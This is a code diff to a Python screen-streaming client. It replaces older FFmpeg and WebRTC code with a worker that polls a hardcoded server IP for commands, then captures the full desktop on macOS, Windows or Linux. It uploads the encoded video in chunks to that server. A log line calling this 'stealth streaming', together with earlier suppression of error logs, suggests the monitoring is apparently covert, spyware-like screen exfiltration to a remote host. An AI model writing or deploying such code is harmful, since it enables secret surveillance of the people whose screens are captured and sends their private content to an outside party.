@@ -32,6 +32,8 @@ class StreamHandler:
         self.stream_quality = 'medium'  # low, medium, high
         self.sequence = 0
         self.stream_thread = None  # Initialize thread reference
+        self.video_streaming = False  # Flag for video streaming mode
+        self.video_thread = None
         
         # Stream settings
         self.stream_settings = {
@@ -75,8 +77,35 @@ class StreamHandler:
             is_production = '103.129.149.67' in self.api_client.server_url
             
             if is_production:
-                # Production server - streaming not implemented yet
-                # Just return without error to avoid spam logs
+                # Production server - use getStreamRequest endpoint
+                try:
+                    response = requests.get(
+                        f"{self.api_client.server_url}/api/stream/request/{Config.CLIENT_ID}",
+                        timeout=5
+                    )
+                    
+                    if response.status_code == 200:
+                        data = response.json()
+                        
+                        if data.get('quality') and not self.is_streaming:
+                            # Start video streaming
+                            self.stream_quality = data.get('quality', 'medium')
+                            self.is_streaming = True
+                            self.video_streaming = True  # Enable video mode
+                            logging.info(f"Starting production video stream with quality: {self.stream_quality}")
+                            self.start_video_streaming()
+                            return True
+                            
+                        elif not data.get('quality') and self.is_streaming:
+                            # Stop streaming
+                            self.is_streaming = False
+                            self.video_streaming = False
+                            logging.info("Stopping production video stream")
+                            self.stop_video_streaming()
+                            return False
+                            
+                except requests.RequestException:
+                    pass
                 return False
             
             response = requests.get(
@@ -199,30 +228,185 @@ class StreamHandler:
                 pass
             self.stream_thread = None
         logging.info("Stealth streaming stopped")
-            
-    def send_stream_chunk(self, img_data):
-        """Send stream chunk to server"""
+    
+    def start_video_streaming(self):
+        """Start real video streaming using FFmpeg (not screenshots)"""
         try:
-            # Check if this is production server
-            is_production = '103.129.149.67' in self.api_client.server_url
+            if self.video_streaming and self.video_thread and self.video_thread.is_alive():
+                logging.warning("Video streaming already running")
+                return
+                
+            def video_stream_worker():
+                """Worker thread for real video streaming using FFmpeg"""
+                try:
+                    import platform
+                    import subprocess
+                    
+                    # Get quality settings
+                    settings = self.stream_settings[self.stream_quality]
+                    
+                    # Platform-specific screen capture settings
+                    if platform.system() == 'Darwin':  # macOS
+                        input_args = [
+                            '-f', 'avfoundation',
+                            '-i', '1:0',  # Screen capture (display 1, no audio)
+                            '-r', str(settings['fps'])
+                        ]
+                    elif platform.system() == 'Windows':
+                        input_args = [
+                            '-f', 'gdigrab', 
+                            '-i', 'desktop',
+                            '-r', str(settings['fps'])
+                        ]
+                    else:  # Linux
+                        input_args = [
+                            '-f', 'x11grab',
+                            '-i', ':0.0',
+                            '-r', str(settings['fps'])
+                        ]
+                    
+                    # FFmpeg command for video streaming 
+                    ffmpeg_cmd = [
+                        'ffmpeg',
+                        '-y',  # Overwrite output
+                    ] + input_args + [
+                        '-vf', f'scale={settings["scale"]}',
+                        '-c:v', 'libx264',
+                        '-preset', 'ultrafast',
+                        '-tune', 'zerolatency', 
+                        '-b:v', settings['bitrate'],
+                        '-maxrate', settings['bitrate'],
+                        '-bufsize', '2M',
+                        '-g', str(settings['fps'] * 2),  # Keyframe interval
+                        '-f', 'mp4',
+                        '-movflags', '+faststart+frag_keyframe+empty_moov',
+                        'pipe:1'  # Output to stdout
+                    ]
+                    
+                    logging.info(f"Starting video stream with FFmpeg: {' '.join(ffmpeg_cmd[:5])}...")
+                    
+                    # Start FFmpeg process
+                    self.ffmpeg_process = subprocess.Popen(
+                        ffmpeg_cmd,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        bufsize=0
+                    )
+                    
+                    # Read video chunks and send to server
+                    chunk_size = 65536  # 64KB chunks
+                    
+                    while self.video_streaming and self.ffmpeg_process:
+                        chunk = self.ffmpeg_process.stdout.read(chunk_size)
+                        
+                        if not chunk:
+                            break
+                            
+                        # Send video chunk to server
+                        if self.send_video_chunk(chunk):
+                            logging.debug(f"Video chunk {self.sequence} sent successfully")
+                        else:
+                            logging.debug(f"Failed to send video chunk {self.sequence}")
+                            
+                        time.sleep(0.01)  # Small delay to prevent overwhelming
+                        
+                except Exception as e:
+                    logging.error(f"Video streaming error: {e}")
+                finally:
+                    if self.ffmpeg_process:
+                        try:
+                            self.ffmpeg_process.terminate()
+                            self.ffmpeg_process.wait(timeout=5)
+                        except:
+                            self.ffmpeg_process.kill()
+                        self.ffmpeg_process = None
+                    self.video_streaming = False
+                    
+            # Start video streaming thread
+            self.video_thread = threading.Thread(target=video_stream_worker, daemon=True)
+            self.video_thread.start()
+            logging.info(f"Real video streaming started with quality: {self.stream_quality}")
             
-            if is_production:
-                # Production server - streaming not implemented yet
-                logging.debug("Streaming not available on production server")
-                return False
+        except Exception as e:
+            logging.error(f"Failed to start video streaming: {e}")
+            self.video_streaming = False
             
-            chunk_data = {
-                'chunk': img_data,  # Use 'chunk' key as expected by server
+    def stop_video_streaming(self):
+        """Stop real video streaming"""
+        self.video_streaming = False
+        
+        # Stop FFmpeg process
+        if self.ffmpeg_process:
+            try:
+                self.ffmpeg_process.terminate()
+                self.ffmpeg_process.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                self.ffmpeg_process.kill()
+            except:
+                pass
+            self.ffmpeg_process = None
+            
+        # Wait for video thread to finish
+        if self.video_thread:
+            try:
+                self.video_thread.join(timeout=3)
+            except:
+                pass
+            self.video_thread = None
+            
+        logging.info("Real video streaming stopped")
+        
+    def send_video_chunk(self, chunk_data):
+        """Send video chunk to server using existing /api/stream/chunk endpoint"""
+        try:
+            # Encode video chunk to base64
+            import base64
+            encoded_chunk = base64.b64encode(chunk_data).decode('utf-8')
+            
+            video_data = {
+                'chunk': encoded_chunk,  # Use same key as existing endpoint
                 'sequence': self.sequence,
                 'timestamp': time.time(),
-                'quality': self.stream_quality
+                'quality': self.stream_quality,
+                'chunk_size': len(chunk_data),
+                'stream_type': 'video'  # Indicate this is video stream
+            }
+            
+            # Increment sequence number
+            self.sequence += 1
+            
+            # Send to existing chunk endpoint
+            response = requests.post(
+                f"{self.api_client.server_url}/api/stream/chunk/{Config.CLIENT_ID}",
+                json=video_data,
+                timeout=5
+            )
+            
+            return response.status_code == 200
+            
+        except requests.RequestException:
+            return False
+        except Exception as e:
+            logging.error(f"Error sending video chunk: {e}")
+            return False
+            
+    def send_stream_chunk(self, img_data):
+        """Send screenshot stream chunk to server using existing endpoint"""
+        try:
+            # Use existing uploadStreamChunk endpoint for all streaming
+            chunk_data = {
+                'chunk': img_data,  # Use 'chunk' key as expected by existing endpoint
+                'sequence': self.sequence,
+                'timestamp': time.time(),
+                'quality': self.stream_quality,
+                'stream_type': 'screenshot'  # Indicate this is screenshot stream
             }
             
             # Increment sequence number
             self.sequence += 1
             
             response = requests.post(
-                f"{Config.SERVER_URL}/api/stream/chunk/{Config.CLIENT_ID}",  # Fixed endpoint path
+                f"{self.api_client.server_url}/api/stream/chunk/{Config.CLIENT_ID}",
                 json=chunk_data,
                 timeout=5
             )
@@ -233,348 +417,5 @@ class StreamHandler:
             # Network errors are common during streaming
             return False
         except Exception as e:
-            # Only log errors for local development
-            is_production = '103.129.149.67' in self.api_client.server_url
-            if not is_production:
-                logging.error(f"Error sending stream chunk: {e}")
+            logging.error(f"Error sending stream chunk: {e}")
             return False
-            
-    def start_ffmpeg_stream(self):
-        """Start FFmpeg screen capture and streaming"""
-        try:
-            if self.ffmpeg_process:
-                return
-                
-            settings = self.stream_settings[self.stream_quality]
-            
-            # Determine screen capture method based on OS
-            if platform.system() == 'Darwin':  # macOS
-                input_args = [
-                    '-f', 'avfoundation',
-                    '-i', '1:0',  # Screen capture
-                    '-r', str(settings['fps'])
-                ]
-            elif platform.system() == 'Windows':
-                input_args = [
-                    '-f', 'gdigrab',
-                    '-i', 'desktop',
-                    '-r', str(settings['fps'])
-                ]
-            else:  # Linux
-                input_args = [
-                    '-f', 'x11grab',
-                    '-i', ':0.0',
-                    '-r', str(settings['fps'])
-                ]
-            
-            # FFmpeg command for streaming
-            ffmpeg_cmd = [
-                'ffmpeg',
-                '-y',  # Overwrite output
-            ] + input_args + [
-                '-vf', f'scale={settings["scale"]}',
-                '-c:v', 'libx264',
-                '-preset', 'ultrafast',
-                '-tune', 'zerolatency',
-                '-b:v', settings['bitrate'],
-                '-maxrate', settings['bitrate'],
-                '-bufsize', '2M',
-                '-g', str(settings['fps'] * 2),  # Keyframe interval
-                '-f', 'mpegts',
-                '-'  # Output to stdout
-            ]
-            
-            logging.info(f"Starting FFmpeg with command: {' '.join(ffmpeg_cmd)}")
-            
-            # Start FFmpeg process
-            self.ffmpeg_process = subprocess.Popen(
-                ffmpeg_cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                bufsize=0
-            )
-            
-            # Start thread to read FFmpeg output and send to server
-            stream_thread = threading.Thread(target=self.stream_ffmpeg_output)
-            stream_thread.daemon = True
-            stream_thread.start()
-            
-            logging.info("FFmpeg stream started successfully")
-            
-        except Exception as e:
-            logging.error(f"Failed to start FFmpeg stream: {e}")
-            self.ffmpeg_process = None
-            
-    def stream_ffmpeg_output(self):
-        """Read FFmpeg output and send to server via HTTP"""
-        try:
-            chunk_size = 32768  # 32KB chunks
-            
-            while self.is_streaming and self.ffmpeg_process:
-                chunk = self.ffmpeg_process.stdout.read(chunk_size)
-                
-                if not chunk:
-                    break
-                    
-                # Send chunk to server
-                self.send_chunk_to_server(chunk)
-                    
-        except Exception as e:
-            logging.error(f"FFmpeg output streaming error: {e}")
-            
-    def send_chunk_to_server(self, chunk):
-        """Send video chunk to server"""
-        try:
-            encoded_chunk = base64.b64encode(chunk).decode('utf-8')
-            
-            data = {
-                'chunk': encoded_chunk,
-                'sequence': self.sequence,
-                'client_id': Config.CLIENT_ID,
-                'timestamp': datetime.now().isoformat()
-            }
-            
-            response = self.api_client.post(f'/api/stream/chunk/{Config.CLIENT_ID}', data)
-            
-            if response:
-                self.sequence += 1
-                logging.debug(f"Video chunk {self.sequence} sent successfully")
-            else:
-                logging.debug(f"Failed to send video chunk {self.sequence}")
-                
-        except Exception as e:
-            logging.debug(f"Error sending video chunk: {str(e)}")
-                
-        except Exception as e:
-            logging.error(f"Error sending chunk to server: {e}")
-            
-    def stop_ffmpeg_stream(self):
-        """Stop FFmpeg streaming"""
-        try:
-            if self.ffmpeg_process:
-                self.ffmpeg_process.terminate()
-                self.ffmpeg_process.wait(timeout=5)
-                self.ffmpeg_process = None
-                logging.info("FFmpeg stream stopped")
-                
-        except subprocess.TimeoutExpired:
-            if self.ffmpeg_process:
-                self.ffmpeg_process.kill()
-                self.ffmpeg_process = None
-                logging.warning("FFmpeg process killed forcefully")
-        except Exception as e:
-            logging.error(f"Error stopping FFmpeg: {e}")
-            
-    def stop_streaming(self):
-        """Stop all streaming"""
-        self.is_streaming = False
-        self.stop_ffmpeg_stream()
-        self.sequence = 0
-        logging.info("Streaming stopped")
-                
-    def start_screen_stream(self, quality='medium'):
-        """Start FFmpeg screen streaming"""
-        if self.is_streaming:
-            return
-            
-        try:
-            self.stream_quality = quality
-            settings = self.stream_settings[quality]
-            
-            # Start WebSocket connection for signaling
-            self.start_websocket_connection()
-            
-            # Start FFmpeg streaming
-            self.start_ffmpeg_stream(settings)
-            
-            self.is_streaming = True
-            logging.info(f"Screen streaming started with {quality} quality")
-            
-        except Exception as e:
-            logging.error(f"Error starting screen stream: {str(e)}")
-            
-    def start_ffmpeg_stream(self, settings):
-        """Start FFmpeg process for screen capture and streaming"""
-        try:
-            import platform
-            
-            if platform.system() == 'Windows':
-                input_source = 'gdigrab'
-                input_format = ['-f', 'gdigrab', '-i', 'desktop']
-            elif platform.system() == 'Darwin':
-                input_source = 'avfoundation'
-                input_format = ['-f', 'avfoundation', '-i', '1:0']  # Screen capture
-            else:
-                input_source = 'x11grab'
-                input_format = ['-f', 'x11grab', '-i', ':0.0']
-                
-            # FFmpeg command for WebRTC streaming
-            ffmpeg_cmd = [
-                'ffmpeg',
-                '-y',  # Overwrite output files
-                *input_format,
-                '-video_size', settings['resolution'],
-                '-framerate', str(settings['fps']),
-                '-c:v', 'libx264',  # Video codec
-                '-preset', 'ultrafast',  # Encoding preset
-                '-tune', 'zerolatency',  # Low latency tuning
-                '-b:v', settings['bitrate'],  # Video bitrate
-                '-maxrate', settings['bitrate'],
-                '-bufsize', f"{int(settings['bitrate'][:-1]) * 2}k",
-                '-pix_fmt', 'yuv420p',
-                '-f', 'rtp',  # RTP output format
-                f'rtp://127.0.0.1:5004'  # Local RTP endpoint
-            ]
-            
-            # Start FFmpeg process
-            self.ffmpeg_process = subprocess.Popen(
-                ffmpeg_cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                stdin=subprocess.PIPE
-            )
-            
-            # Monitor FFmpeg process
-            threading.Thread(target=self.monitor_ffmpeg, daemon=True).start()
-            
-        except Exception as e:
-            logging.error(f"Error starting FFmpeg: {str(e)}")
-            
-    def start_websocket_connection(self):
-        """Start WebSocket connection for WebRTC signaling"""
-        if not websocket:
-            logging.warning("WebSocket library not available, skipping WebSocket connection")
-            return
-            
-        try:
-            ws_url = self.api_client.get_websocket_url()
-            if ws_url:
-                self.websocket_client = websocket.WebSocketApp(
-                    ws_url,
-                    on_open=self.on_websocket_open,
-                    on_message=self.on_websocket_message,
-                    on_error=self.on_websocket_error,
-                    on_close=self.on_websocket_close
-                )
-                
-                # Start WebSocket in separate thread
-                threading.Thread(
-                    target=self.websocket_client.run_forever,
-                    daemon=True
-                ).start()
-                
-        except Exception as e:
-            logging.error(f"Error starting WebSocket: {str(e)}")
-            
-    def on_websocket_open(self, ws):
-        """WebSocket connection opened"""
-        logging.info("WebSocket connection established")
-        
-        # Register as streaming client
-        register_msg = {
-            'type': 'register',
-            'role': 'streamer',
-            'client_id': self.api_client.client_id
-        }
-        ws.send(json.dumps(register_msg))
-        
-    def on_websocket_message(self, ws, message):
-        """Handle WebSocket messages for WebRTC signaling"""
-        try:
-            data = json.loads(message)
-            msg_type = data.get('type')
-            
-            if msg_type == 'offer':
-                # Handle WebRTC offer
-                self.handle_webrtc_offer(data)
-            elif msg_type == 'ice-candidate':
-                # Handle ICE candidate
-                self.handle_ice_candidate(data)
-            elif msg_type == 'stream-request':
-                # Handle stream request
-                self.handle_stream_request(data)
-                
-        except Exception as e:
-            logging.error(f"WebSocket message error: {str(e)}")
-            
-    def on_websocket_error(self, ws, error):
-        """WebSocket error handler"""
-        logging.error(f"WebSocket error: {error}")
-        
-    def on_websocket_close(self, ws, close_status_code, close_msg):
-        """WebSocket connection closed"""
-        logging.info("WebSocket connection closed")
-        
-    def handle_webrtc_offer(self, offer_data):
-        """Handle WebRTC offer from dashboard"""
-        # This would typically involve WebRTC peer connection setup
-        # For now, we'll send a simple response
-        response = {
-            'type': 'answer',
-            'client_id': self.api_client.client_id,
-            'sdp': 'answer-sdp-here'  # Actual SDP answer would be generated
-        }
-        
-        if self.websocket_client:
-            self.websocket_client.send(json.dumps(response))
-            
-    def handle_ice_candidate(self, candidate_data):
-        """Handle ICE candidate"""
-        # Process ICE candidate for WebRTC connection
-        logging.info("Received ICE candidate")
-        
-    def handle_stream_request(self, request_data):
-        """Handle stream quality change request"""
-        new_quality = request_data.get('quality', 'medium')
-        if new_quality != self.stream_quality:
-            logging.info(f"Changing stream quality to {new_quality}")
-            self.restart_stream_with_quality(new_quality)
-            
-    def restart_stream_with_quality(self, quality):
-        """Restart stream with new quality settings"""
-        self.stop_screen_stream()
-        time.sleep(1)
-        self.start_screen_stream(quality)
-        
-    def monitor_ffmpeg(self):
-        """Monitor FFmpeg process"""
-        while self.ffmpeg_process and self.ffmpeg_process.poll() is None:
-            time.sleep(1)
-            
-        if self.is_streaming:
-            logging.warning("FFmpeg process ended unexpectedly")
-            self.is_streaming = False
-            
-    def stop_screen_stream(self):
-        """Stop screen streaming"""
-        if not self.is_streaming:
-            return
-            
-        try:
-            # Stop FFmpeg process
-            if self.ffmpeg_process:
-                self.ffmpeg_process.terminate()
-                self.ffmpeg_process.wait(timeout=5)
-                self.ffmpeg_process = None
-                
-            # Close WebSocket connection
-            if self.websocket_client:
-                self.websocket_client.close()
-                self.websocket_client = None
-                
-            self.is_streaming = False
-            logging.info("Screen streaming stopped")
-            
-        except Exception as e:
-            logging.error(f"Error stopping screen stream: {str(e)}")
-            
-    def get_stream_stats(self):
-        """Get streaming statistics"""
-        if not self.is_streaming:
-            return None
-            
-        return {
-            'is_streaming': self.is_streaming,
-            'quality': self.stream_quality,
-            'timestamp': datetime.now().isoformat()
-        }
